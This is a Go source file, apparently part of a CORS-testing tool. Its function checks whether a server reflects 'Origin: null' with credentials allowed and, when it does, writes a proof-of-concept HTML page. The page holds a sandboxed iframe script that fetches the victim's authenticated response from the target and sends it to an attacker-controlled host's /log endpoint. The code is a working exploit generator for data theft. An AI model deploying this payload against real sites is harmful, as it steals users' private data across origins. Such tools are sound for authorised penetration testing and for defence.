package functions

import (
	"fmt"
	"net/http"
	"net/url"
)

func OriginNull(client *http.Client, target, malicious, cookie string, parsedURL *url.URL, hideFails bool) {
	resp, err := NewRequest(client, target, "null", cookie)
	if err != nil {
		Error("[-] Error making request with Origin: null", hideFails)
		return
	}
	defer resp.Body.Close()

	allowOrigin := resp.Header.Get("Access-Control-Allow-Origin")
	allowCred := resp.Header.Get("Access-Control-Allow-Credentials")

	if allowOrigin == "null" && allowCred == "true" {
		Success("[+] CORS misconfiguration: server reflects Origin: null")
		fmt.Println("\033[38;5;46m" + "Perfect combination for exploration, generating PoC" + "\033[0m")

		payload := `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
			var req = new XMLHttpRequest();
			req.onload = reqListener;
			req.open('get','%s',true);
			req.withCredentials = true;
			req.send();
			function reqListener() {
				location='%s/log?key='+encodeURIComponent(this.responseText);
			};
		</script>"></iframe>`

		html := fmt.Sprintf(payload, target, malicious)
		filename := parsedURL.Host + "_origin_null_iframe.html"
		GeneratePoC(filename, html)
	} else {
		Error("[-] Origin: null not reflected", hideFails)
	}
}
